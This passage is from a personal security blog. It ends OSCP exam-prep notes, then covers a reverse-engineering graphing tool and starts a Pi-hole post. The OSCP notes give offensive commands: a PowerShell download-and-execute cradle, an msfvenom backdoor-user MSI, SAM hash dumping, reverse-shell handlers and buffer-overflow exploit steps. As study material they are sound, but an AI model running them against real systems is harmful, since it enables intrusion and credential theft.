&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir /a &quot;C:\Program Files&quot; 
dir /a &quot;C:\Program Files (x86)&quot; 
reg query HKEY_LOCAL_MACHINE\SOFTWARE 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dumping windows password hashes: You can use fgdump.exe to dump passwords in a file ending with .pwdump. Fgdump will also attempt to kill local antiviruses before dumping the passwords.&lt;/p&gt;

&lt;p&gt;Adding users: &lt;code class=&quot;highlighter-rouge&quot;&gt;net user [username] [password] /ADD&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Changing group: &lt;code class=&quot;highlighter-rouge&quot;&gt;net localgroup [group name] [username] /ADD&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;AlwaysElevated: Check if these two registry values are set to 1 by using &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt;. If they are, then use the following command to create a malicious MSI: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi&lt;/code&gt;. Send the MSI to the target, and run the MSI file using &lt;code class=&quot;highlighter-rouge&quot;&gt;msiexec /quiet /qn /i evil.msi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Looking at the registry: If you can’t use the reg command, use the regedit command instead.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;regedit /E file.reg &quot;REGISTRY/VALUE/TO/READ&quot;
type file.reg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Getting admin hashes: Look in the below locations for password hashes&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;%SYSTEMROOT%\repair\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\repair\system&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\SYSTEM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Download both the SAM file and the SYSTEM file onto Kali Linux, and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket-secretdump -sam SAM -system SYSTEM local&lt;/code&gt; to get the hashes.&lt;/p&gt;

&lt;p&gt;Searching for exploits: Run &lt;a href=&quot;https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py&quot;&gt;this script&lt;/a&gt; on Kali.&lt;/p&gt;

&lt;p&gt;Checklists:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot;&gt;fuzzysecurity&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&quot;&gt;absolomb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jaws Windows Enumerate Script (Requires Powershell): The script is found &lt;a href=&quot;https://github.com/411Hall/Jaws&quot;&gt;here&lt;/a&gt;. You can easily download and run the script using the following commands (assuming that you have a webserver setup on Kali and you have put the jaws-enum.ps1 file under /var/www/html).&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell 
IEX(New-Object Net.WebClient).downloadString('http://[your IP]/jaws-enum.ps1') 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;

&lt;p&gt;Selecting a module:
&lt;code class=&quot;highlighter-rouge&quot;&gt;use [module]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Setting a payload:
&lt;code class=&quot;highlighter-rouge&quot;&gt;use [payload]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Common payloads:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
  &lt;li&gt;php/reverse_php&lt;/li&gt;
  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Handle incoming connections:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
set LHOST [local IP]
set LPORT [port]
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Common meterpreter commands:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Upload files: &lt;code class=&quot;highlighter-rouge&quot;&gt;upload [local file] [remote location for file]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Download files: &lt;code class=&quot;highlighter-rouge&quot;&gt;download [remote file] [local location for file]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Open a shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Find basic information about the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Get the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Search for a file: &lt;code class=&quot;highlighter-rouge&quot;&gt;search –f *pass*.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Take a screenshot of the desktop: &lt;code class=&quot;highlighter-rouge&quot;&gt;screenshot&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Convert metasploit modules to stand alone (a little bit advanced): &lt;a href=&quot;https://netsec.ws/?p=262&quot;&gt;https://netsec.ws/?p=262&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;steps-for-buffer-overflow&quot;&gt;Steps for Buffer Overflow&lt;/h3&gt;
&lt;p&gt;1.) Gradually fuzz the input until you see that the program has crashed. Here is an example program that can be used for fuzzing:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python 
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; 
&lt;span class=&quot;c1&quot;&gt;# Create an array of buffers, from 1 to 5900, with increments of 200. 
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Fuzzing PASS with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'IP address'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Change IP and port!
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'USER test&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PASS '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'QUIT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2.) We need to figure out where the program crashed. Use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size]&lt;/code&gt;, where size is a possible size that crashed the program in the previous step. This program will create a string that you should use as input into the program. After sending the string to the program, view it in a debugger, and copy the value of EIP right when the program crashed. You can then use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [size] -q [EIP's value]&quot;&lt;/code&gt; to discover the precise location where you can rewrite EIP.&lt;/p&gt;

&lt;p&gt;3.) We need to check for bad characters, which are characters that should not be in your shellcode because they could delete part of your string (such as the \x00 character, which terminates strings in C). Below, there is a list of characters.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; 
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; 
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; 
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; 
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; 
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; 
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; 
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; 
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; 
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; 
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; 
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; 
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; 
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; 
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; 
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Send the whole string to the vulnerable application. If one of the character is a badchar, then it will delete the rest of the string or not show up. Gradually delete values that are badchars until the whole string is able to be sent, and make sure you keep a list of badchars that have been deleted.&lt;/p&gt;

&lt;p&gt;4.) We need to find some instruction that says “JMP ESP” so that we can just jump to the location our input and start executing code. Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona modules&lt;/code&gt; command in Immunity to find DLLs that have Rebase, SafeSEH, ASLR, and NXCompat set to false (which basically means that the DLL will always load at the same address). Once you find a good DLL, use the follwing command to find a JMP ESP command: &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona find -s &quot;\xff\xe4&quot; -m [DLL's file name]&lt;/code&gt;. Note that the hex equivalent of JMP ESP is \xff\xe4, but you may have to modify this depending on your machine. This command will return a list of pointers to a JMP ESP instruction; select one that does not have any bad characters. If you’re using EDB, open up the OpcodeSearcher plugin, set the Jump Equivalent value to ESP-&amp;gt;EIP, and hit find. Confirm that the JMP works by setting a breakpoint at that location and setting EIP equal to that address of the jump instruction using the buffer overflow.&lt;/p&gt;

&lt;p&gt;5.) Develop a payload using msfvenom that does not contain any bad characters.&lt;/p&gt;

&lt;p&gt;6.) After you create the payload, sometimes you may have to execute some extra code before running the payload, in which case, you can use /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to quickly write assembly code. You may also want to put a NOP sled at the beginning of your code if there is space.&lt;/p&gt;

&lt;p&gt;7.) Setup a reverse shell listener. Create your final exploit and run it.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</summary></entry><entry><title type="html">Creating a Code Grapher Tool</title><link href="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html" rel="alternate" type="text/html" title="Creating a Code Grapher Tool" /><published>2019-11-27T00:00:00-05:00</published><updated>2019-11-27T00:00:00-05:00</updated><id>http://localhost:4000/2019/11/27/creating-code-grapher-tool</id><content type="html" xml:base="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html">&lt;p&gt;A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;this simple tool&lt;/a&gt; came from.&lt;/p&gt;

&lt;p&gt;To give you an example of how this works, suppose you wanted to reverse engineer the following function:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000000001135 &amp;lt;magic&amp;gt;:
    1135:	55                   	push   %rbp
    1136:	48 89 e5             	mov    %rsp,%rbp
    1139:	89 7d fc             	mov    %edi,-0x4(%rbp)
    113c:	8b 45 fc             	mov    -0x4(%rbp),%eax
    113f:	0f af 45 fc          	imul   -0x4(%rbp),%eax
    1143:	5d                   	pop    %rbp
    1144:	c3                   	retq   

0000000000001145 &amp;lt;main&amp;gt;:
    1145:	55                   	push   %rbp
    1146:	48 89 e5             	mov    %rsp,%rbp
    1149:	48 83 ec 10          	sub    $0x10,%rsp
    114d:	bf 03 00 00 00       	mov    $0x3,%edi
    1152:	e8 de ff ff ff       	callq  1135 &amp;lt;magic&amp;gt;
    1157:	89 45 fc             	mov    %eax,-0x4(%rbp)
    115a:	8b 45 fc             	mov    -0x4(%rbp),%eax
    115d:	89 c6                	mov    %eax,%esi
    115f:	48 8d 3d 9e 0e 00 00 	lea    0xe9e(%rip),%rdi        # 2004 &amp;lt;_IO_stdin_used+0x4&amp;gt;
    1166:	b8 00 00 00 00       	mov    $0x0,%eax
    116b:	e8 c0 fe ff ff       	callq  1030 &amp;lt;printf@plt&amp;gt; 1170:	b8 00 00 00 00       	mov    $0x0,%eax
    1175:	c9                   	leaveq 
    1176:	c3                   	retq   
    1177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    117e:	00 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you use my script and run the following command, a graph will appear, which will display all of the outputs for the magic() function when you use inputs in the range [0,100] (0 is inclusive, 100 is exclusive).&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;float: center;&quot; src=&quot;../../../assets/img/2019-11-27-creating-a-code-grapher-tool/graph.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Furthermore, there is also a list of points printed out in the output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Points:
[(0, 0), (1, 1), (2, 4), (4, 16), (3, 9), (5, 25), (7, 49), (6, 36), (8, 64), (9, 81), (14, 196), (10, 100), (11, 121), (12, 144), (13, 169), (17, 289), (16, 256), (15, 225), (18, 324), (19, 361), (23, 529), (20, 400), (21, 441), (22, 484), (24, 576), (26, 676), (25, 625), (28, 784), (27, 729), (30, 900), (29, 841), (32, 1024), (31, 961), (33, 1089), (35, 1225), (36, 1296), (34, 1156), (37, 1369), (38, 1444), (41, 1681), (39, 1521), (40, 1600), (42, 1764), (43, 1849), (46, 2116), (44, 1936), (45, 2025), (47, 2209), (49, 2401), (50, 2500), (48, 2304), (51, 2601), (53, 2809), (54, 2916), (52, 2704), (55, 3025), (56, 3136), (57, 3249), (58, 3364), (60, 3600), (59, 3481), (61, 3721), (62, 3844), (64, 4096), (63, 3969), (65, 4225), (66, 4356), (71, 5041), (67, 4489), (68, 4624), (70, 4900), (69, 4761), (72, 5184), (76, 5776), (74, 5476), (75, 5625), (73, 5329), (80, 6400), (81, 6561), (78, 6084), (77, 5929), (79, 6241), (85, 7225), (83, 6889), (84, 7056), (86, 7396), (82, 6724), (88, 7744), (89, 7921), (87, 7569), (90, 8100), (91, 8281), (94, 8836), (93, 8649), (92, 8464), (96, 9216), (95, 9025), (97, 9409), (98, 9604), (99, 9801)]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Essentially, the way that this works is that my Python script will set two breakpoints. In this example, the breakpoints were set at sym.magic and sym.main+21. At sym.magic, the input register (which is set to be rdi) is changed to be one of the input values in the specified range. At sym.main+21, eax is read as the output value, and the point (rdi, eax) is plotted onto the graph.&lt;/p&gt;

&lt;p&gt;The script is implemented using &lt;a href=&quot;https://github.com/radareorg/radare2-r2pipe&quot;&gt;r2pipe&lt;/a&gt;, which allows me to use radare2 commands from within Python and receive their output, and &lt;a href=&quot;https://matplotlib.org/&quot;&gt;matplotlib&lt;/a&gt;, which allows me to easily create graphs in a few lines of code.&lt;/p&gt;

&lt;p&gt;There are several options built within the script that you can use to aid your analysis. You can see all of the options below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python grapher.py -h 
usage: grapher.py [options] filename start stop input output range

Analyzes specified lines of code by executing the code using the given input
values, recording the output, and displaying the input and output in a graph.

positional arguments:
  filename              The name of the executable you would like to analyze.
  start                 The first breakpoint will be set at this location. At
                        the breakpoint, the input register or memory location
                        will be changed to the next value in the range.
  stop                  The second breakpoint will be set at this location. At
                        the breakpoint, the output will be recorded.
  input                 The register or memory location that contains the
                        input value that should be bruteforced. Will be
                        displayed on the x-axis. Example: &quot;eax&quot;. If using a
                        memory location, please specify the location using
                        m[location]. Example: &quot;m[rbp-0x8]&quot;.
  output                The register or memory location that contains the
                        output values that should be checked after the code is
                        executed. Will be displayed on the y-axis. Example:
                        &quot;eax&quot;. If using a memory location, please specify the
                        location using m[location]. Example: &quot;m[rbp-0x8]&quot;.
  range                 The range of values that should be used for the input
                        during the bruteforce process. Should be in the form
                        &quot;[lower,upper]&quot; or &quot;[lower,upper,step]&quot;. For example:
                        [0,101,5] will use 0, 5, 10, ..., 95, 100 as the x
                        values in the graph. These must be in base 10
                        (hexadecimal or binary will not work).

optional arguments:
  -h, --help            show this help message and exit
  -t [THREADS], --threads [THREADS]
                        The number of threads that will be used during
                        execution. Default value is 5.
  -in [INPUT_FILE], --standard-input [INPUT_FILE]
                        Uses the 'dor stdin=[INPUT_FILE]' command in radare2
                        to make the executable read standard input from a
                        given file instead of having the user type it in.
  -il [INPUT_LENGTH], --input-length [INPUT_LENGTH]
                        The amount of bytes placed at the input memory
                        location. Default value is 1, but this will be
                        automatically adjusted if it is too small. Is only
                        used if the input is a memory location and not a
                        register.
  -ol [OUTPUT_LENGTH], --output-length [OUTPUT_LENGTH]
                        The amount of bytes read at the output memory
                        location. Must be equal to either 1, 2, 4, or 8.
                        Default value is 1. Is only used if the output is a
                        memory location and not a register.
  -e [COMMANDS], --execute [COMMANDS]
                        Executes the given r2 commands in radare2 right after
                        the debugger hits the first breakpoint, but before the
                        input value is set. Example: -e &quot;dr ebx = 7&quot; will
                        always set ebx equal to 7 at the first breakpoint.
                        Multiple commands can be separated by a semicolon.
  -hx, --x-axis-hex     Displays the x-axis in hexadecimal instead of denary.
  -hy, --y-axis-hex     Displays the y-axis in hexadecimal instead of denary.
  -j, --jump            Instead of running all of the code that comes before
                        the breakpoint, if this option is set, rip/eip will
                        immidiately be set to the start value as soon as the
                        program opens. This will essentially jump over any
                        code that comes before the first breakpoint, and it
                        will make the program only execute the code between
                        the starting and stopping breakpoints.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The script can be found &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for this simple tool came from.</summary></entry><entry><title type="html">Network-wide Ad Blocking Using Pi-hole</title><link href="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html" rel="alternate" type="text/html" title="Network-wide Ad Blocking Using Pi-hole" /><published>2019-06-15T00:00:00-04:00</published><updated>2019-06-15T00:00:00-04:00</updated><id>http://localhost:4000/2019/06/15/pi-hole-ad-blocker</id><content type="html" xml:base="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html">&lt;p&gt;As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using &lt;a href=&quot;https://pi-hole.net/&quot;&gt;Pi-hole&lt;/a&gt;. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that 